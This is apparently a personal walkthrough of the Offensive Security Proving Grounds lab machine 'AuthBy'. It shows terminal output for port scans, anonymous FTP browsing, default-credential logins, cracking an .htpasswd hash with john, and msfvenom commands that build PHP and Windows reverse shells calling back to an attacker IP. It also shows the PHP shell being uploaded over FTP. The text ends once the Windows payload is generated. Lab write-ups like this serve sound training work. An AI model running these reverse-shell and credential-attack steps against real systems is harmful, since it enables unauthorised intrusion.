# AuthBy

# Enumeration

## nmap

```
┌──(kali㉿kali)-[/tmp]
└─$ rustscan -a 192.168.162.46                                                                                                                                  1 ⨯ 1 ⚙
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.162.46:21
Open 192.168.162.46:242
Open 192.168.162.46:3145
Open 192.168.162.46:3389
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-29 00:39 EST
Initiating Ping Scan at 00:39
Scanning 192.168.162.46 [2 ports]
Completed Ping Scan at 00:39, 3.01s elapsed (1 total hosts)
Nmap scan report for 192.168.162.46 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.21 seconds

```

```
# Nmap 7.91 scan initiated Fri Jan 28 22:32:23 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/AuthBy/results/192.168.162.46/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/AuthBy/results/192.168.162.46/scans/xml/_full_tcp_nmap.xml" 192.168.162.46
Nmap scan report for 192.168.162.46
Host is up, received user-set (0.17s latency).
Scanned at 2022-01-28 22:32:25 EST for 175s
Not shown: 65531 filtered ports
Reason: 65531 no-responses
PORT     STATE SERVICE            REASON          VERSION
21/tcp   open  ftp                syn-ack ttl 127 zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Jan 29 11:31 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Jul 26  2021 accounts
242/tcp  open  http               syn-ack ttl 127 Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin         syn-ack ttl 127 zFTPServer admin
3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 127
| ssl-cert: Subject: commonName=LIVDA
| Issuer: commonName=LIVDA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-06-03T21:15:17
| Not valid after:  2021-12-03T21:15:17
| MD5:   bb3f f979 9fc1 9d02 baa7 d0a4 9ccb 0922
| SHA-1: d0a1 8a6a 8326 1123 85f2 59e3 71ea c66c f3a4 048f
| -----BEGIN CERTIFICATE-----
| MIICzjCCAbagAwIBAgIQGttsFTOC+IFFUDrl75tnVzANBgkqhkiG9w0BAQUFADAQ
| MQ4wDAYDVQQDEwVMSVZEQTAeFw0yMTA2MDMyMTE1MTdaFw0yMTEyMDMyMTE1MTda
| MBAxDjAMBgNVBAMTBUxJVkRBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAw5XIXz8iD9nH+yWmmm8qL9mhTX2ePktQVr8V+9pejC7+QnNWIBRiQgn1n24f
| LXtl9fWPICyoHMRlMzPYZXddHGgFU8ld7UwJs2q5/egKfKE25T0Qp6GN8KesIzkn
| un0mIJY7eEx+U+KbjH6Yh7607bGmy3Mjpa18WqwF+i2WWBF8bXDvuZPkcWP2YWBQ
| 01LoDtUFGJ0KeCFIHFe5eCsREFkYKkqLhvGCYPl3EYKVY3Av2VE8VUtf2HadzF1s
| LBlefoT3p26bKr4guGhXUk8EXSNfHZAMl9mGlGX11A4RpVx/gna4Lx/elUYnfLNP
| oSVwjm2I4M/cQyeWXK670acSTwIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAHGQtYLWjpu4Mebquf3u
| xfUqqlq+012JEgM2W2j/ny/ax71gMxKa2jr6bWWhfN8j2cNe0tEsJYmaHsiq12l9
| OnOiJ6pSq9HBSp8lycCZ6uyXmPfcYYMuurcAf0dvUjBVbNr7vt74DogaJUzM7HH+
| Do+r1PIODTQdPPiBS+Ygmx1tyStwnMIg47WHslB5L22t31xruDx83l2BzUftdbPB
| /xy1v6LqHhKR/1JPVVbad5dGBJT5nZqPSM2NS6OmiUyZlZbvkLQo8WOnHgq7fSHu
| ylD3NdGLQzpIV6R6tzkY/Gw8gWLH3pFCppgxL7nsnYltPYPDqhT7WHudKsS6CrYC
| 3Ws=
|_-----END CERTIFICATE-----
|_ssl-date: 2022-01-29T03:34:01+00:00; -1m18s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/28%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61F4B5F8%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=7)
OPS(O1=M54ENW8ST11%O2=M54ENW8ST11%O3=M54ENW8NNT11%O4=M54ENW8ST11%O5=M54ENW8ST11%O6=M54EST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M54ENW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.005 days (since Fri Jan 28 22:27:48 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1m18s

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   171.87 ms 192.168.49.1
2   171.86 ms 192.168.162.46

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 28 22:35:20 2022 -- 1 IP address (1 host up) scanned in 178.64 seconds

```

## 21 - FTP
### File read

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.162.46                                                                                                                                              1 ⚙
Connected to 192.168.162.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.162.46:kali): anonymous
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd log
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 21043
----------   1 root     root          136 Mar 30  2020 stor-2020-03-30.log
----------   1 root     root          386 Mar 30  2020 retr-2020-03-30.log
----------   1 root     root            0 Jan 29 11:31 log-2022-01-28.log
----------   1 root     root          368 Jul 26  2021 log-2021-07-26.log
----------   1 root     root            0 Jun 05  2021 log-2021-06-04.log
----------   1 root     root          574 Jul 10  2020 log-2020-07-09.log
----------   1 root     root        71178 Mar 30  2020 log-2020-03-30.log
----------   1 root     root          930 Mar 27  2020 log-2020-03-26.log
----------   1 root     root          568 Mar 25  2020 log-2020-03-24.log
----------   1 root     root          568 Mar 05  2015 log-2015-03-05.log
----------   1 root     root         1134 Feb 28  2015 log-2015-02-27.log
----------   1 root     root          572 Nov 03  2014 log-2014-11-03.log
----------   1 root     root         1712 May 22  2013 log-2013-05-22.log
----------   1 root     root         2440 Jun 12  2012 log-2012-06-11.log
----------   1 root     root         1142 May 25  2012 log-2012-05-24.log
----------   1 root     root          208 Dec 15  2011 log-2011-12-15.log
----------   1 root     root          944 Dec 15  2011 log-2011-12-14.log
----------   1 root     root         1150 Dec 14  2011 log-2011-12-13.log
----------   1 root     root          208 Dec 13  2011 log-2011-12-12.log
----------   1 root     root      6877584 Nov 09  2011 log-2011-11-09.log
----------   1 root     root     14575458 Nov 09  2011 log-2011-11-08.log
226 Closing data connection.
ftp> cd ../extensions
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
226 Closing data connection.
ftp> cd ../certificates
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
226 Closing data connection.
ftp> cd ../accounts
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Jul 26  2021 backup
----------   1 root     root          764 Jul 26  2021 acc[Offsec].uac
----------   1 root     root         1032 Jan 29 11:34 acc[anonymous].uac
----------   1 root     root          926 Jul 26  2021 acc[admin].uac
226 Closing data connection.
ftp> cd backup
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 4
----------   1 root     root          764 Jun 05  2021 acc[Offsec].uac
----------   1 root     root         1030 Jun 05  2021 acc[anonymous].uac
----------   1 root     root          926 Jun 05  2021 acc[admin].uac
226 Closing data connection.
ftp> cd ../../
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 9680
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Jan 29 11:31 log
----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Jul 26  2021 accounts
226 Closing data connection.
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$        
```

From here you can identify 3 users, Offsec, anonymous and admin

### logging in as admin
Test `admin`:`admin

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p php/reverse_php LHOST=192.168.49.162 LPORT=443  -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3011 bytes
Saved as: shell.php
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh ryu@192.168.162.46                                                      
ssh: connect to host 192.168.162.46 port 22: Connection timed out
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.162.46                                                                                                                                            255 ⨯
Connected to 192.168.162.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.162.46:kali): offsec
331 User name received, need password.
Password:
530 Access denied: Home directory not available
Login failed.
ftp> ls
530 Not logged in.
ftp: bind: Address already in use
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.162.46
Connected to 192.168.162.46.
220 zFTPServer v6.0, build 2011-10-17 14:25 ready.
Name (192.168.162.46:kali): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> get .htpasswd
local: .htpasswd remote: .htpasswd
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
45 bytes received in 0.09 secs (0.4693 kB/s)
ftp> get .htaccess
local: .htaccess remote: .htaccess
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
161 bytes received in 0.10 secs (1.5676 kB/s)
ftp> get index.php
local: index.php remote: index.php
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
76 bytes received in 0.10 secs (0.7137 kB/s)
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT Command successful.
150 File status okay; about to open data connection.
226 Closing data connection.
3011 bytes sent in 0.00 secs (62.4242 MB/s)
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 6
-r--r--r--   1 root     root         3011 Jan 29 14:59 shell.php
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

### Cracking the hash

```
┌──(kali㉿kali)-[/tmp]
└─$ cat .htaccess 
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat .htpasswd 
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ hashcat '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' /usr/share/wordlists/rockyou.txt                                                          
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, 1424/1488 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hash '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0': Token length exception
No hashes loaded.

Started: Sat Jan 29 02:02:02 2022
Stopped: Sat Jan 29 02:02:02 2022
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' > hash                                                                                                            255 ⨯
cat: '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0': No such file or directory
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ echo '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' > hash                                                                                                             1 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                   
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
elite            (?)
1g 0:00:00:01 DONE (2022-01-29 02:02) 0.5847g/s 14821p/s 14821c/s 14821C/s lovestruck..260989
Use the "--show" option to display all of the cracked passwords reliably
Session completed
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cat index.php                                     
<center><pre>Qui e nuce nuculeum esse volt, frangit nucem!</pre></center>                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

### Potential Exploits

https://www.google.com/search?q=ZFTPserver+admin+exploit+-AuthBy&sxsrf=APq-WBugTax1kApgw0UifxLOee1XtVKBDw%3A1643427997215&ei=nbj0YYfWDM7Xz7sPgpSOwAs&ved=0ahUKEwjHmPOvhtb1AhXO63MBHQKKA7gQ4dUDCA8&uact=5&oq=ZFTPserver+admin+exploit+-AuthBy&gs_lcp=Cgdnd3Mtd2l6EAM6BwgAEEcQsANKBAhBGABKBAhGGABQ9ARY9yFg8CNoA3ACeACAAT-IAf4EkgECMTKYAQCgAQHIAQjAAQE&sclient=gws-wiz
* https://vuldb.com/?id.59771

## 242  - Web

### nikto

```
┌──(kali㉿kali)-[/tmp]
└─$ nikto -ask=no -h http://192.168.162.46:242 2>&1 | tee "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/AuthBy/results/192.168.162.46/scans/tcp_242_http_nikto.txt"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.162.46
+ Target Hostname:    192.168.162.46
+ Target Port:        242
+ Start Time:         2022-01-28 23:08:19 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (Win32) PHP/5.3.8
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm 'Qui e nuce nuculeum esse volt, frangit nucem!'
+ PHP/5.3.8 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Retrieved x-powered-by header: PHP/5.3.8
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 8877 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-01-28 23:35:54 (GMT-5) (1655 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

### logging in

![](Pasted%20image%2020220129115129.png)

![](Pasted%20image%2020220129120953.png)

## logging using creds from 21

![](Pasted%20image%2020220129150507.png)



## 3145 - zftp-admin         syn-ack ttl 127 zFTPServer admin

FTP

```
┌──(kali㉿kali)-[/tmp]
└─$ nc 192.168.162.46 3145 -v                                                                                                                                       1 ⚙
192.168.162.46: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.162.46] 3145 (?) open
220 .
help
500 Access denied
user admin
331 User name received, need password.
pass admin
530 Login not accepted: Wrong username or password
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ftp 192.168.162.46 3145                                                                                                                                         1 ⚙
Connected to 192.168.162.46.
220 .
Name (192.168.162.46:kali): admin
331 User name received, need password.
Password:
530 Login not accepted: Wrong username or password
Login failed.
421 Service not available, remote server has closed connection
ftp> exit
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$   
```

Guessing credentials `offsec`:`offsec` from port 21

```
                                                                                                                                                                        
┌──(kali㉿kali)-[~/snmp-shell]
└─$ ftp 192.168.162.46 3145
Connected to 192.168.162.46.
220 .
Name (192.168.162.46:kali): offsec
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
drw-rw-r--   1 root     root          512 Jan 29 06:39 E:DRIVE_CDROM:<CD-Rom>
drw-rw-r--   1 root     root          512 Jan 29 06:39 D:DRIVE_CDROM:<CD-Rom>
drw-rw-r--   1 root     root          512 Jan 29 06:39 C:DRIVE_FIXED:
drw-rw-r--   1 root     root          512 Jan 29 06:39 $:NETWORK_NEIGHBORHOOD:
226 Closing data connection.
ftp> cd C:DRIVE_FIXED:
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
-rw-rw-r--   1 root     root           20 Dec 14  2011 wins.ld
drw-rw-r--   1 root     root          512 Mar 05  2015 Windows
drw-rw-r--   1 root     root          512 Nov 08  2011 wamp
drw-rw-r--   1 root     root          512 Jul 10  2020 Users
drw-rw-r--   1 root     root          512 Dec 20  2009 System Volume Information
drw-rw-r--   1 root     root          512 Nov 09  2011 ProgramData
drw-rw-r--   1 root     root          512 May 22  2013 Program Files
drw-rw-r--   1 root     root          512 Jan 19  2008 PerfLogs
drw-rw-r--   1 root     root          512 Dec 20  2009 ManageEngine
drw-rw-r--   1 root     root          512 Jan 19  2008 Documents and Settings
-rw-rw-r--   1 root     root           10 Sep 19  2006 config.sys
-rw-rw-r--   1 root     root         8192 Dec 20  2009 BOOTSECT.BAK
-rw-rw-r--   1 root     root       333203 Jan 19  2008 bootmgr
drw-rw-r--   1 root     root          512 Dec 20  2009 Boot
-rw-rw-r--   1 root     root           24 Sep 19  2006 autoexec.bat
-rw-rw-r--   1 root     root       439953 Dec 14  2011 AIPHV
drw-rw-r--   1 root     root          512 Mar 30  2020 $Recycle.Bin
226 Closing data connection.
ftp> cd Users
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
drw-rw-r--   1 root     root          512 Jan 19  2008 Public
-rw-rw-r--   1 root     root          174 Jan 19  2008 desktop.ini
drw-rw-r--   1 root     root          512 Jan 19  2008 Default User
drw-rw-r--   1 root     root          512 Feb 28  2015 Default
drw-rw-r--   1 root     root          512 Nov 08  2011 apache
drw-rw-r--   1 root     root          512 Jan 19  2008 All Users
drw-rw-r--   1 root     root          512 Feb 15  2010 Administrator
226 Closing data connection.
ftp> cd apache
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
drw-rw-r--   1 root     root          512 Nov 08  2011 Videos
drw-rw-r--   1 root     root          512 Nov 08  2011 Templates
drw-rw-r--   1 root     root          512 Nov 08  2011 Start Menu
drw-rw-r--   1 root     root          512 Nov 08  2011 SendTo
drw-rw-r--   1 root     root          512 Nov 08  2011 Searches
drw-rw-r--   1 root     root          512 Nov 08  2011 Saved Games
drw-rw-r--   1 root     root          512 Nov 08  2011 Recent
drw-rw-r--   1 root     root          512 Nov 08  2011 PrintHood
drw-rw-r--   1 root     root          512 Nov 08  2011 Pictures
-rw-rw-r--   1 root     root           20 Nov 08  2011 ntuser.ini
-rw-rw-r--   1 root     root       524288 Nov 08  2011 NTUSER.DAT{7d5ec63a-c5bc-11dc-a02b-0019bbe6a65a}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-r--   1 root     root       524288 Jul 10  2020 NTUSER.DAT{7d5ec63a-c5bc-11dc-a02b-0019bbe6a65a}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-r--   1 root     root        65536 Jul 10  2020 NTUSER.DAT{7d5ec63a-c5bc-11dc-a02b-0019bbe6a65a}.TM.blf
-rw-rw-r--   1 root     root            0 Nov 08  2011 ntuser.dat.LOG2
-rw-rw-r--   1 root     root       262144 Jan 29 11:37 ntuser.dat.LOG1
-rw-rw-r--   1 root     root       786432 Jan 29 11:37 NTUSER.DAT
drw-rw-r--   1 root     root          512 Nov 08  2011 NetHood
drw-rw-r--   1 root     root          512 Nov 08  2011 My Documents
drw-rw-r--   1 root     root          512 Nov 08  2011 Music
drw-rw-r--   1 root     root          512 Nov 08  2011 Local Settings
drw-rw-r--   1 root     root          512 Nov 08  2011 Links
drw-rw-r--   1 root     root          512 Nov 08  2011 Favorites
drw-rw-r--   1 root     root          512 Nov 08  2011 Downloads
drw-rw-r--   1 root     root          512 Nov 08  2011 Documents
drw-rw-r--   1 root     root          512 Jul 10  2020 Desktop
drw-rw-r--   1 root     root          512 Nov 08  2011 Cookies
drw-rw-r--   1 root     root          512 Nov 08  2011 Contacts
drw-rw-r--   1 root     root          512 Nov 08  2011 Application Data
drw-rw-r--   1 root     root          512 Nov 08  2011 AppData
226 Closing data connection.
ftp> cd Desktop
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
-rw-rw-r--   1 root     root           34 Jan 29 11:30 local.txt
-rw-rw-r--   1 root     root          282 Nov 08  2011 desktop.ini
226 Closing data connection.
ftp> get local.txt
local: local.txt remote: local.txt
200 PORT Command successful.
550 "RETR" Command not implemented.
ftp> exit
221 Goodbye.
                                                                                                                                                                        
┌──(kali㉿kali)-[~/snmp-shell]
└─$ 

```

Other drives

```
┌──(kali㉿kali)-[~/snmp-shell]
└─$ ftp 192.168.162.46 3145                                                       
Connected to 192.168.162.46.
220 .
Name (192.168.162.46:kali): offsec
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
drw-rw-r--   1 root     root          512 Jan 29 06:41 E:DRIVE_CDROM:<CD-Rom>
drw-rw-r--   1 root     root          512 Jan 29 06:41 D:DRIVE_CDROM:<CD-Rom>
drw-rw-r--   1 root     root          512 Jan 29 06:41 C:DRIVE_FIXED:
drw-rw-r--   1 root     root          512 Jan 29 06:41 $:NETWORK_NEIGHBORHOOD:
226 Closing data connection.
ftp> help
Commands may be abbreviated.  Commands are:

!               dir             mdelete         qc              site
$               disconnect      mdir            sendport        size
account         exit            mget            put             status
append          form            mkdir           pwd             struct
ascii           get             mls             quit            system
bell            glob            mode            quote           sunique
binary          hash            modtime         recv            tenex
bye             help            mput            reget           tick
case            idle            newer           rstatus         trace
cd              image           nmap            rhelp           type
cdup            ipany           nlist           rename          user
chmod           ipv4            ntrans          reset           umask
close           ipv6            open            restart         verbose
cr              lcd             prompt          rmdir           ?
delete          ls              passive         runique
debug           macdef          proxy           send
ftp> cd D:DRIVE_CDROM:<CD-Rom>
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
226 Closing data connection.
ftp> cd ../E:DRIVE_CDROM:<CD-Rom>
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
226 Closing data connection.
ftp> cd ..
250 CWD Command successful.
ftp> cd C:DRIVE_FIXED:
250 CWD Command successful.
ftp> cd ..
250 CWD Command successful.
ftp> cd $:NETWORK_NEIGHBORHOOD:
250 CWD Command successful.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
drw-rw-r--   1 root     root          512 Jan 29 06:43 $NETWORK:Microsoft Windows Network
drw-rw-r--   1 root     root          512 Jan 29 06:43 $NETWORK:Microsoft Terminal Services
226 Closing data connection.
ftp> cd $NETWORK:Microsoft Windows Network 
550 Access denied
ftp> cd $NETWORK:Microsoft Terminal Services
550 Access denied
ftp> cd ..
250 CWD Command successful.
ftp> cd C:DRIVE_FIXED:
250 CWD Command successful.
ftp> 

```

```
ftp> pwd
257 "/C:DRIVE_FIXED:/wamp/www/" is working directory.
ftp> ls
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 0
-rw-rw-r--   1 root     root         3011 Jan 29 14:59 shell.php
-rw-rw-r--   1 root     root        73802 Jan 29 15:09 meterpreter.exe
-rw-rw-r--   1 root     root           76 Nov 08  2011 index.php
-rw-rw-r--   1 root     root           45 Nov 08  2011 .htpasswd
-rw-rw-r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
ftp> 

```

## 3389


# Exploitation

Upload reverse shell as shown in 21

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.162 LPORT=443  EXITFUNC=thread -f exe > meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
                                                                                                                                                                        
